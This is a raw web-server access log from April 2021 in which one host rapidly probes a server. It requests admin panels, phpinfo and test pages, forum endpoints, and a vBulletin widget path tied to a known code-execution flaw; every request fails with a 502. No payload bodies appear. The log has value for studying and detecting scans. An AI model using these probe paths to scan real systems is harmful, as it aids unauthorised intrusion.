101.89.19.140 - - [18/Apr/2021:23:22:44 +0800] "GET http://121.5.231.59/manager/html HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
49.0.123.11 - - [18/Apr/2021:23:31:55 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
49.0.123.11 - - [18/Apr/2021:23:31:55 +0800] "GET /robots.txt HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
49.0.123.11 - - [18/Apr/2021:23:31:56 +0800] "POST /Admin3be70579/Login.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
49.0.123.11 - - [18/Apr/2021:23:31:57 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
49.0.123.11 - - [18/Apr/2021:23:31:58 +0800] "GET /l.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
49.0.123.11 - - [18/Apr/2021:23:31:58 +0800] "GET /phpinfo.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
49.0.123.11 - - [18/Apr/2021:23:31:59 +0800] "GET /test.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
49.0.123.11 - - [18/Apr/2021:23:32:00 +0800] "POST /index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:01 +0800] "POST /bbs.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:01 +0800] "POST /forum.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:03 +0800] "POST /forums.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:04 +0800] "POST /bbs/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:07 +0800] "POST /forum/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:08 +0800] "POST /forums/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
49.0.123.11 - - [18/Apr/2021:23:32:09 +0800] "POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
49.0.123.11 - - [18/Apr/2021:23:32:10 +0800] "POST /bbs/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
49.0.123.11 - - [18/Apr/2021:23:32:10 +0800] "POST /forum/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
49.0.123.11 - - [18/Apr/2021:23:32:12 +0800] "POST /forums/ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
